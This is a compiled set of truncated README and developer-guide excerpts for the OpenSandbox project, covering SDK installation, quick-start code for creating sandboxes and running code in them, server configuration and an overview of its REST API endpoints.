This SDK requires a Docker image containing the Code Interpreter runtime environment. You must use the
`opensandbox/code-interpreter` image (or a derivative) which includes pre-installed runtimes for Python, Java, Go,
Node.js, etc.

For detailed information about supported languages and versions, refer to the
[Environment Documentation](../../../sandboxes/code-interpreter/README.md).

## Installation

### pip

```bash
pip install opensandbox-code-interpreter
```

### uv

```bash
uv add opensandbox-code-interpreter
```

## Quick Start

The following example demonstrates how to create a sandbox with a specific runtime configuration and execute a simple
script.

```python
import asyncio
from datetime import timedelta

from code_interpreter import CodeInterpreter, SupportedLanguage
from opensandbox import Sandbox
from opensandbox.config import ConnectionConfig

async def main() -> None:
    # 1. Configure connection
    config = ConnectionConfig(
        domain="api.opensandbox.io",
        api_key="your-api-key",
        request_timeout=timedelta(seconds=60),
    )

    # 2. Create a Sandbox with the code-interpreter image + runtime versions
    sandbox = await Sandbox.create(
        "opensandbox/code-interpreter:latest",
        connection_config=config,
        entrypoint=["/opt/opensandbox/code-interpreter.sh"],
        env={
            "PYTHON_VERSION": "3.11",
            "JAVA_VERSION": "17",
            "NODE_VERSION": "20",
            "GO_VERSION": "1.24",
        },
    )

    # 3. Use async context manager to ensure local resources are cleaned up
    async with sandbox:
        # 4. Create CodeInterpreter wrapper
        interpreter = await CodeInterpreter.create(sandbox=sandbox)

        # 5. Create an execution context (Python)
        context = await interpreter.codes.create_context(SupportedLanguage.PYTHON)

        # 6. Run code
        result = await interpreter.codes.run(
            "import sys\nprint(sys.version)\nresult = 2 + 2\nresult",
            context=context,
        )

        # 7. Print output
        if result.result:
            print(result.result[0].text)

        # 8. Cleanup remote instance (optional but recommended)
        await interpreter.kill()

if __name__ == "__main__":
    asyncio.run(main())
```

### Synchronous Quick Start

If you prefer a synchronous API, use `SandboxSync` + `CodeInterpreterSync`:

```python
from datetime import timedelta

import httpx
from code_interpreter import CodeInterpreterSync
from opensandbox import SandboxSync
from opensandbox.config import ConnectionConfigSync

config = ConnectionConfigSync(
    domain="api.opensandbox.io",
    api_key="your-api-key",
    request_timeout=timedelta

---

### OpenSandbox SDK for Python
*File: `sdks/sandbox/python/README.md`*

# OpenSandbox SDK for Python

English | [中文](README_zh.md)

A Python SDK for low-level interaction with OpenSandbox. It provides capabilities to create, manage, and interact with secure sandbox environments, including executing shell commands, managing files, and monitoring resources.

## Installation

### pip

```bash
pip install opensandbox
```

### uv

```bash
uv add opensandbox
```

## Quick Start

The following example shows how to create a sandbox and execute a shell command.

> **Note**: Before running this example, ensure the OpenSandbox service is running. See the root [README.md](../../../README.md) for startup instructions.

```python
import asyncio
from opensandbox.sandbox import Sandbox
from opensandbox.config import ConnectionConfig
from opensandbox.exceptions import SandboxException

async def main():
    # 1. Configure connection
    config = ConnectionConfig(
        domain="api.opensandbox.io",
        api_key="your-api-key"
    )

    # 2. Create a Sandbox
    try:
        sandbox = await Sandbox.create(
            "ubuntu",
            connection_config=config
        )
        async with sandbox:

            # 3. Execute a shell command
            execution = await sandbox.commands.run("echo 'Hello Sandbox!'")

            # 4. Print output
            print(execution.logs.stdout[0].text)

            # 5. Cleanup (sandbox.close() called automatically)
            # Note: kill() must be called explicitly if you want to terminate the remote sandbox instance immediately
            await sandbox.kill()

    except SandboxException as e:
        # Handle Sandbox specific exceptions
        print(f"Sandbox Error: [{e.error.code}] {e.error.message}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
```

### Synchronous Quick Start

If you prefer a synchronous API, use `SandboxSync` / `SandboxManagerSync` and `ConnectionConfigSync`:

```python
from datetime import timedelta

import httpx
from opensandbox import SandboxSync
from opensandbox.config import ConnectionConfigSync

config = ConnectionConfigSync(
    domain="api.opensandbox.io",
    api_key="your-api-key",
    request_timeout=timedelta(seconds=30),
    transport=httpx.HTTPTransport(limits=httpx.Limits(max_connections=20)),
)

sandbox = SandboxSync.create("ubuntu", connection_config=config)
with sandbox:
    execution = sandbox.commands.run("echo 'Hello Sandbox!'")
    print(execution.logs.stdout[0].text)
    sandbox.kill()
```

## Usage Examples

### 1. Lifecycle Management

Manage the sandbox lifecycle, including renewal, pausing, and resuming.

```python
from datetime import timedelta

# Renew the sandbox
# This resets the expiration time to (current time + duration)
await sandbox.renew(timedelta(minutes=30))

# Pause execution (suspends all processes)
await sandbox.pause()

# Resume execution
await sandbox.resume()

# Get current status
info = await sandbox.get_info()
print(f"State: {info.status.state}")
```


---

## Server

*2 documents*

### OpenSandbox Server
*File: `server/README.md`*

# OpenSandbox Server

English | [中文](README_zh.md)

A production-grade, FastAPI-based service for managing the lifecycle of containerized sandboxes. It acts as the control plane to create, run, monitor, and dispose isolated execution environments across container platforms.

## Features

### Core capabilities
- **Lifecycle APIs**: Standardized REST interfaces for create, start, pause, resume, delete
- **Pluggable runtimes**:
  - **Docker**: Production-ready
  - **Kubernetes**: Configuration placeholder, under development
- **Automatic expiration**: Configurable TTL with renewal
- **Access control**: API Key authentication (`OPEN-SANDBOX-API-KEY`); can be disabled for local/dev
- **Networking modes**:
  - Host: shared host network, performance first
  - Bridge: isolated network with built-in HTTP routing
- **Resource quotas**: CPU/memory limits with Kubernetes-style specs
- **Observability**: Unified status with transition tracking
- **Registry support**: Public and private images

### Extended capabilities
- **Async provisioning**: Background creation to reduce latency
- **Timer restoration**: Expiration timers restored after restart
- **Env/metadata injection**: Per-sandbox environment and metadata
- **Port resolution**: Dynamic endpoint generation
- **Structured errors**: Standard error codes and messages

## Requirements

- **Python**: 3.10 or higher
- **Package Manager**: [uv](https://github.com/astral-sh/uv) (recommended) or pip
- **Runtime Backend**:
  - Docker Engine 20.10+ (for Docker runtime)
  - Kubernetes 1.21+ (for Kubernetes runtime, when available)
- **Operating System**: Linux, macOS, or Windows with WSL2

## Quick Start

### Installation

1. **Clone the repository** and navigate to the server directory:
   ```bash
   cd server
   ```

2. **Install dependencies** using `uv`:
   ```bash
   uv sync
   ```

### Configuration

The server uses a TOML configuration file to select and configure the underlying runtime.

**Create configuration file**:
```bash
cp example.config.toml ~/.sandbox.toml
```
**[optional] Create K8S configuration file：
The K8S version of the Sandbox Operator needs to be deployed in the cluster, refer to the Kubernetes directory.
```bash
cp example.config.k8s.toml ~/.sandbox.toml
cp example.batchsandbox-template.yaml ~/batchsandbox-template.yaml
```

**[optional] Edit `~/.sandbox.toml`** for your environment:

**Option A: Docker runtime + host networking (default)**
   ```toml
   [server]
   host = "0.0.0.0"
   port = 8080
   log_level = "INFO"
   api_key = "your-secret-api-key-change-this"

   [runtime]
   type = "docker"
   execd_image = "opensandbox/execd:latest"

   [docker]
   network_mode = "host"  # Containers share host network; only one sandbox instance at a time
   ```

**Option B: Docker runtime + bridge networking**
   ```toml
   [server]
   host = "0.0.0.0"
   port = 8080
   log_level = "INFO"
   api_key = "your-secret-api-key-change-this"

   [runtime]
   type = "docker"
   execd_image = "opensandbox/e

---

### Development Guide
*File: `server/DEVELOPMENT.md`*

# Development Guide

This guide provides comprehensive information for developers working on OpenSandbox Server, including environment setup, architecture deep-dive, testing strategies, and contribution workflows.

## 📋 Table of Contents

- [Development Environment Setup](#development-environment-setup)
- [Project Structure](#project-structure)
- [Architecture Deep Dive](#architecture-deep-dive)
- [Development Workflow](#development-workflow)
- [Testing Guide](#testing-guide)
- [Working with Docker Runtime](#working-with-docker-runtime)
- [Working with Kubernetes Runtime](#working-with-kubernetes-runtime)
- [Code Style and Standards](#code-style-and-standards)
- [Debugging](#debugging)
- [Performance Optimization](#performance-optimization)
- [Contributing](#contributing)

## Development Environment Setup

### Prerequisites

- **Python 3.10+**: Check version with `python --version`
- **uv**: Install from [https://github.com/astral-sh/uv](https://github.com/astral-sh/uv)
- **Docker**: For local development and testing
- **Git**: Version control
- **IDE**: VS Code, PyCharm, or Cursor (recommended for AI assistance)

### Initial Setup

1. **Clone and Navigate**
   ```bash
   git clone https://github.com/alibaba/OpenSandbox.git
   cd OpenSandbox/server
   ```

2. **Install Dependencies**
   ```bash
   uv sync
   ```

3. **Verify Installation**
   ```bash
   uv run python -c "import fastapi; print(fastapi.__version__)"
   ```

4. **Configure Development Environment**
   ```bash
   cp example.config.toml ~/.sandbox.toml
   ```

   Edit `~/.sandbox.toml` for local development:
   ```toml
   [server]
   host = "0.0.0.0"
   port = 8080
   log_level = "DEBUG"
   api_key = "your-secret-api-key-change-this"

   [runtime]
   type = "docker"
   execd_image = "opensandbox/execd:latest"

   [docker]
   network_mode = "host"
   ```

5. **Run Development Server**
   ```bash
   uv run python -m src.main
   ```

### IDE Configuration

#### VS Code / Cursor

Create `.vscode/launch.json`:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Python: FastAPI",
            "type": "python",
            "request": "launch",
            "module": "src.main",
            "justMyCode": false,
            "env": {
                "SANDBOX_CONFIG_PATH": "${workspaceFolder}/.sandbox.toml"
            }
        }
    ]
}
```

#### PyCharm

1. Open project in PyCharm
2. Configure Python interpreter: **Settings → Project → Python Interpreter**
3. Select the virtual environment created by `uv sync`
4. Enable pytest: **Settings → Tools → Python Integrated Tools → Testing → pytest**

## Project Structure

```
server/
├── src/                          # Source code
│   ├── main.py                   # FastAPI application entry point
│   ├── config.py                 # Configuration management
│   ├── api/                      # API layer
│   │   ├── lifecycle.py          # Sandbox lifecycle routes
│   │   └── schema.py             # Pydantic models


---

## Specs

*1 documents*

### OpenSandbox API Specifications
*File: `specs/README.md`*

# OpenSandbox API Specifications

English | [中文](README_zh.md)

This directory contains OpenAPI specification documents for the OpenSandbox project, defining the complete API interfaces and data models.

## Specification Files

### 1. sandbox-lifecycle.yml

**Sandbox Lifecycle Management API**

Defines the complete lifecycle interfaces for creating, managing, and destroying sandbox environments.

**Core Features:**
- **Sandbox Management**: Create, list, query, and delete sandbox instances
- **State Control**: Pause and resume sandbox execution
- **Lifecycle States**: Support multiple state transitions (Pending → Running → Pausing → Paused → Stopping → Terminated)
- **Resource Configuration**: CPU, memory, GPU, and other resource limit configurations
- **Image Support**: Create sandboxes directly from container images, supporting both public and private registries
- **Timeout Management**: Automatic expiration and manual renewal capabilities
- **Endpoint Access**: Retrieve public access endpoints for services running inside sandboxes

**Main Endpoints:**
- `POST /v1/sandboxes` - Create sandbox
- `GET /v1/sandboxes` - List sandboxes (with filtering and pagination)
- `GET /v1/sandboxes/{sandboxId}` - Get sandbox details
- `DELETE /v1/sandboxes/{sandboxId}` - Delete sandbox
- `POST /v1/sandboxes/{sandboxId}/pause` - Pause sandbox
- `POST /v1/sandboxes/{sandboxId}/resume` - Resume sandbox
- `POST /v1/sandboxes/{sandboxId}/renew-expiration` - Renew sandbox expiration
- `GET /v1/sandboxes/{sandboxId}/endpoints/{port}` - Get access endpoint

**Authentication:**
- HTTP Header: `OPEN-SANDBOX-API-KEY: your-api-key`
- Environment Variable: `OPEN_SANDBOX_API_KEY` (for SDK clients)

### 2. execd-api.yaml

**Code Execution API Inside Sandbox**

Defines interfaces for executing code, commands, and file operations within sandbox environments, providing complete code interpreter and filesystem management capabilities.

**Core Features:**
- **Code Execution**: Stateful code execution supporting Python, JavaScript, and other languages
- **Command Execution**: Shell command execution with foreground/background modes
- **File Operations**: Complete CRUD operations for files and directories
- **Real-time Streaming**: Real-time output streaming via SSE (Server-Sent Events)
- **System Monitoring**: Real-time monitoring of CPU and memory metrics
- **Access Control**: Token-based API authentication

**Main Endpoint Categories:**

**Health Check:**
- `GET /ping` - Service health check

**Code Interpreter:**
- `POST /code/context` - Create code execution context
- `POST /code` - Execute code in context (streaming output)
- `DELETE /code` - Interrupt code execution

**Command Execution:**
- `POST /command` - Execute shell command (streaming output)
- `DELETE /command` - Interrupt command execution

**Filesystem:**
- `GET /files/info` - Get file metadata
- `DELETE /files` - Delete files
- `POST /files/permissions` - Change file permissions
- `POST /files/mv` - Move/rename fil

---

